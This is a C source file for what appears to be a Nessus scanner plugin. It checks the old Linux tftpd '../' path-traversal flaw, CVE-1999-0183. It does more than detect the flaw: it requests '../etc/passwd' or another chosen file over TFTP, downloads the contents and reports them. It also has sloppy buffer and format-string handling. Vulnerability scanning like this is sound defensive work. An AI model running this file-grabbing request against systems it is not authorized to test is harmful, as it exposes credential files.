/*
 * linux_tftp.c
 *
 * This plugins attempts to read the file ../etc/passwd or anything
 * else using tftp
 *
 */

#include <includes.h>
/*
 * The following decls are declared in arpa/inet, and thus are 
 * Copyright (c) 1983, 1993 The Regents of the University of California.  
 * All rights reserved.
 */
 
#define RRQ     01                      /* read request */

struct tftp_header {
 unsigned short  th_opcode;              /* packet type */
        union {
                unsigned short  tu_block;       /* block # */
                unsigned short  tu_code;        /* error code */
                char    tu_stuff[1];    /* request packet stuff */
        } th_u;
        char    th_data[1];             /* data or error string */
 };
#define th_block        th_u.tu_block
#define th_code         th_u.tu_code
#define th_stuff        th_u.tu_stuff
#define th_msg          th_data
/**** Now, my stuff */


#define NAME "Linux TFTP get file"
#define DESC "\
There is a faulty access control implementation\n\
in some versions of the Linux tftp daemon.\n\
Most current tftpd implementations attempt\n\
to restrict access to files outside of the tftproot directory.\n\
The Linux implementations disallow any files with /../ in \n\
their pathnames, however one can still access files such as \n\
/etc/passwd by prepending ../ in front of the pathname \n\
(../etc/passwd).  This will work since\n\
the current directory for tftpd is usually /ftpchr\n\
Solution : Upgrade your tftpd\n\
Risk factor : High"

#define FR_DESC "\
Il y a un controle d'accès défectueux dans\n\
certaines versions du daemon tftp de linux.\n\
La plupart des implementations de tftpd essayent\n\
de restreindre l'accès aux fichiers en dehors\n\
de la racine tftp. \n\
L'implementation tftpd de Linux refuse tous les\n\
noms de fichiers contenant /../, mais il est\n\
possible d'acceder au repertoire de plus haut\n\
niveau en rajoutant '../' devant, tel que\n\
../etc/passwd. \n\
Solution : mettez à jour votre tftpd\n\
Facteur de risque : Elevé"

#define COPYRIGHT "no copyright"
#define SUMM "Attempts to grab a via through a bug in some versions of tftp"


PlugExport int plugin_init(struct arglist *desc);
PlugExport int plugin_init(struct arglist *desc)
{
  plug_set_id(desc, 10333);
  plug_set_version(desc, "$Revision: 1.9 $");
  plug_set_cve_id(desc, "CVE-1999-0183");
  plug_set_name(desc, NAME, NULL);
  plug_set_description(desc, FR_DESC, "francais");
  plug_set_description(desc, DESC, NULL);
  
  plug_set_summary(desc, SUMM,NULL);
  plug_set_copyright(desc, COPYRIGHT,NULL);
  plug_set_category(desc, ACT_ATTACK);
  plug_set_family(desc, "Accès aux fichiers distants", "francais");
  plug_set_family(desc, "Remote file access",NULL);
  return(0);
}


PlugExport int plugin_run(struct arglist * env)
{
 int soc;
 struct sockaddr_in addr;
 struct in_addr *p = plug_get_host_ip(env);
 struct tftp_header  * packet;
 char * p_packet;
 char * test_file = get_preference(env, "test_file");
 char * read_timeout = get_preference(env, "checks_read_timeout");
 char * file = NULL;
 char * test_file_with_header;
 int b;
 fd_set read_set;
 char * report;
 int flaw = 0;
 int len = sizeof(struct sockaddr_in);
 struct timeval timeout = {0,0};
 int flag;

 
 
 
 if(read_timeout != NULL)
 {
 	timeout.tv_sec = atoi(read_timeout);
 }
 
 if(timeout.tv_sec <= 0)
   timeout.tv_sec = 5;
   
 flag = (int)plug_get_key(env, "tftp/get_file");
 if(flag)return(0);
  

 
 if ( test_file == NULL )
 	test_file = strdup("/etc/passwd");
 
 p_packet = emalloc(512 + strlen(test_file));
 packet = (struct tftp_header *)p_packet;
 
 
 packet->th_opcode=htons(RRQ);
 test_file_with_header = emalloc(strlen(test_file)+20);
 sprintf(test_file_with_header, "..%s", test_file);
 sprintf(packet->th_stuff, test_file_with_header);
 sprintf(packet->th_stuff+strlen(test_file_with_header)+1,"octet");
 

 soc = socket(AF_INET, SOCK_DGRAM, 0);
 set_socket_source_addr( soc, 0 );
 addr.sin_family = AF_INET;
 addr.sin_addr = *p;
 addr.sin_port = htons(69);
 connect(soc,( struct sockaddr*) &addr, sizeof(addr));
 b = send(soc, packet, 22, 0);
 
 addr.sin_addr = *p;
 addr.sin_port = 0;
 b=512;
 while(b==512)
 {
 unsigned short block;
 addr.sin_addr = *p;
 addr.sin_port = 0;
 bzero(packet, 512);
 FD_ZERO(&read_set);
 FD_SET(soc, &read_set);
 select(soc+1, &read_set, NULL, NULL, &timeout);
 if(!FD_ISSET(soc, &read_set))break;
 b = recv(soc,packet, 512, 0);
 if ( b <= sizeof(struct tftp_header))
 	exit(0);
	
 if(ntohs(packet->th_opcode)==3)
 {
  /* We receive some data : there is a flaw */
  char tmp[512];
  char * tmp2;
  flaw++;
  
  snprintf(tmp, sizeof(tmp), "%s", packet->th_msg);
  if( file == NULL )
  	tmp2 = emalloc(sizeof(tmp)+1);
  else 
  	tmp2 = emalloc(strlen(file)+sizeof(tmp)+1);
  
  if( file == NULL )
  	strncpy(tmp2, tmp, strlen(tmp));
  else 
  	snprintf(tmp2, sizeof(tmp) + 1, "%s%s", file,tmp);
  
  if(file != NULL )
  	efree(&file);
	
  file = emalloc(strlen(tmp2) + 1);
  
  strncpy(file, tmp2, strlen(tmp2));
  
  efree(&tmp2);
 }
 else break;
 block = ntohs(packet->th_block);
 bzero(packet, 512);
 packet->th_opcode = htons(04);
 packet->th_block = htons(block);
 send(soc, packet, 4, 0);
 }
 efree(&test_file_with_header);
 if(flaw)
 {
 report = emalloc(255 + strlen(file) + strlen(test_file));
 sprintf(report, "It was possible to retrieve the file %s\n\
through tftp by appending '..' in front of its name.\n\
Here is what we could grab : \n%s\n\n\
Solution : upgrade your tftpd", test_file, file);
 efree(&file);
 post_hole_udp(env, 69,report);
 }
 return(0);
}
 
 
